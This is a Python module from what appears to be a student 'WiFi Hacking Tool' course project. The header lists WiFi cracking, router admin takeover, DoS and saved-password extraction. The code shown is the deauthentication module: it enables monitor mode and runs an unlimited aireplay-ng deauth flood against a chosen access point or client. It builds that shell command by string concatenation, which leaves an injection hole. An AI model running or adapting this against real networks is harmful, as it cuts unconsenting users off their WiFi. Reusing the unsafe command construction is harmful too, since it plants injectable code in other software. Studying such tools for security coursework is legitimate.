'''
============================================================
                NSSECU2 - Hacking Tool Project
============================================================
        Members: Escalona, Fadrigo, Fortiz, Manzano, Sy
        Topic: WiFi Hacking Tool
        Description: The objective of this project is to 
                     create a packaged tool that will be 
                     able to do Wi-Fi scanning, cracking, 
                     and admin control access.
        Objective Functionalities:
            1. WiFi Scanning & Handshake Capture
            2. WiFi Cracking
            3. WAP/Router Admin Control Access
            4. WiFi DOS
            5. Windows Saved WiFi Passwords
============================================================

DEAUTHENTICATION MODULE
'''

import interfaces.interfaces as interface
import utils.utils as utils
import subprocess

def deauth_wifi(wifi:dict, device, host_macaddress:"", quiet=False):
    wifi_macaddress = wifi["bssid"]
    device_logicalname = interface.get_logicalname(device)

    utils.header("Loading WiFi DOS attack...", "Activating Airmon-ng...")
    interface.terminate_services()
    interface.enable_mon(device)

    utils.header("Loading WiFi DOS attack...", ["Airmon-ng active!","Loading deauth attack..."])

    command = "aireplay-ng -0 0 -a " + wifi_macaddress + " " + device_logicalname
    loading_dos = "Loading WiFi DOS attack..."
    quiet_err = ["Airmon-ng active!","Quiet configuration error"]
    if quiet and host_macaddress != "":
        utils.header(loading_dos, quiet_err)
        if utils.yesNo(loading_dos, quiet_err,"Do you want to continue in \'noisy\' mode?", True):
            command = "aireplay-ng -0 0 -a " + wifi_macaddress + " -c " + host_macaddress + " " + device_logicalname
        else:
            return None

    dos = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    
    return dos